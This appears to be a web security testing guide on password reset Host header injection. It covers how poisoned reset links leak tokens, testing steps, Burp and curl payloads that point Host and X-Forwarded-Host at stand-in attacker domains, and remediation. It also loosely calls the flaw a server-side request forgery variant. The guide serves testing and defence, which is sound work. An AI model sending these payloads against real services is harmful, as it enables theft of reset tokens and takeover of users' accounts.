# Password Reset Host Header Injection

## Overview
Password reset Host Header Injection occurs when an application uses the `Host` HTTP header to construct the password reset link sent to users, rather than using a hardcoded base URL from configuration. An attacker can intercept a reset request, replace the `Host` header with an attacker-controlled domain, and cause the application to send the victim a reset link pointing to the attacker's server — stealing the reset token when the victim clicks it. This is a server-side request forgery variant that leads to account takeover.

## How It Works
- The application receives a password reset request and dynamically builds the reset URL: `https://{Host}/reset?token=...`.
- The attacker submits the reset request for a victim's account but modifies the `Host` header (or `X-Forwarded-Host`, `X-Original-URL`, `X-Forwarded-For`) to point to an attacker-controlled server.
- The server generates the reset email with the malicious URL and sends it to the victim.
- If the victim clicks the link, their browser sends the reset token to the attacker's server.
- The attacker extracts the token from their server logs and uses it to reset the victim's password.
- Variations include `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `Forwarded: host=attacker.com`, or `Host: legitimate.com.attacker.com`.

## Impact
- Account takeover of any user whose email can be submitted in the password reset form.
- No interaction required from a server vulnerability perspective beyond sending the email.
- Particularly devastating for admin accounts — just knowing the admin email is sufficient.
- Can affect all registered users if the attacker submits resets for all enumerated accounts.

## Where to Look
- The password reset request endpoint — any request that takes an email/username and triggers an email with a link.
- Applications running behind reverse proxies or load balancers that forward `X-Forwarded-Host`.
- Frameworks that dynamically derive the base URL from the request's `Host` header (common in Django, Laravel, Rails without hardcoded `ALLOWED_HOSTS` enforcement).
- Email templates that include a clickable reset link built at runtime from the request context.
- Multi-tenant SaaS applications where the domain varies per tenant — these often use the Host header legitimately, creating additional attack surface.

## Testing Steps
1. Initiate a password reset for your own test account through the normal flow; intercept the request in Burp.
2. Modify the `Host` header to your Burp Collaborator or a server you control (e.g., `attacker.com`) and forward the request.
3. Check the email received — does the reset link point to `attacker.com` instead of the legitimate domain?
4. If the standard `Host` header is validated, test: `X-Forwarded-Host: attacker.com`, `X-Original-URL: //attacker.com`, `X-Host: attacker.com`, `Forwarded: host=attacker.com`.
5. Try subdomain bypass: `Host: legitimate.com.attacker.com` or `Host: legitimate.com@attacker.com`.
6. Test port injection: `Host: legitimate.com:attacker.com`.
7. Test double-header: send two `Host` headers — some frameworks use the second one for URL construction.
8. After confirming injection, verify the token actually arrives on your controlled server by clicking the link and checking server logs.

## Payloads / Techniques

Basic Host header injection:
```
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

X-Forwarded-Host bypass:
```
POST /forgot-password HTTP/1.1
Host: legitimate.com
X-Forwarded-Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

Multiple headers to try in sequence:
```
X-Forwarded-Host: attacker.com
X-Original-URL: //attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
Forwarded: host=attacker.com
X-Rewrite-URL: //attacker.com
```

Subdomain bypass attempts:
```
Host: legitimate.com.attacker.com
Host: attacker.com/legitimate.com
Host: legitimate.com@attacker.com
Host: legitimate.com:@attacker.com
```

Port-based injection:
```
Host: attacker.com:80
Host: legitimate.com:443.attacker.com
```

Curl-based test:
```bash
# Test basic Host header injection
curl -v -X POST https://target.com/forgot-password \
  -H "Host: attacker.yourdomain.com" \
  -d "email=youremail@test.com"

# Test X-Forwarded-Host
curl -v -X POST https://target.com/forgot-password \
  -H "X-Forwarded-Host: attacker.yourdomain.com" \
  -d "email=youremail@test.com"
```

Using Burp Collaborator to detect:
```
# Set Host header to your Collaborator payload
POST /forgot-password HTTP/1.1
Host: xxxxxxxxxxxx.burpcollaborator.net

email=victim@target.com
```

## Burp Suite Tips
- Right-click the password reset request in **Proxy** history and send to **Repeater**.
- In Repeater, manually edit the `Host` header; use your **Burp Collaborator** subdomain as the value.
- After sending, click "Poll now" in the Collaborator client to check for DNS/HTTP interactions containing the reset token in the URL path.
- Use the **"Active Scan"** feature in Burp Pro — it includes a Host header injection check that tests common variations automatically.
- The **Collaborator Everywhere** extension automatically adds Collaborator payloads to Host-related headers in every request, passively detecting Host header injection without manual effort.
- Use **Match and Replace** to automatically substitute the Host header with your Collaborator payload in all password reset requests during automated scanning.

## Tools
- **Burp Suite + Collaborator** — Detect out-of-band Host header injection via DNS/HTTP callbacks.
- **Interactsh** — Open-source alternative to Burp Collaborator for OOB detection.
- **curl** — Rapid manual testing of different header combinations.
- **Nuclei** — Templates for password reset Host header injection in popular frameworks.
- **ParamSpider + custom wordlist** — Discover additional hidden headers that might influence URL construction.

## Remediation
- Hardcode the application's base URL in server-side configuration (`APP_URL`, `SITE_URL`, `BASE_URL`); never derive it dynamically from the `Host` header.
- If using `X-Forwarded-Host` for reverse proxy setups, only trust it when it originates from a known internal proxy IP and whitelist the allowable values.
- Implement an allowlist of valid Host header values (e.g., Django's `ALLOWED_HOSTS`, Spring's server configuration) and reject requests with invalid Host headers.
- In email templates, use the hardcoded base URL from configuration, not from the request context.
- Validate that the constructed URL's domain matches the application's configured domain before sending.
- Conduct security regression tests for Host header injection on all email-triggering endpoints after any framework upgrade.

## References
https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning
https://portswigger.net/web-security/host-header
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection
https://hackerone.com/reports/226659
https://cwe.mitre.org/data/definitions/640.html
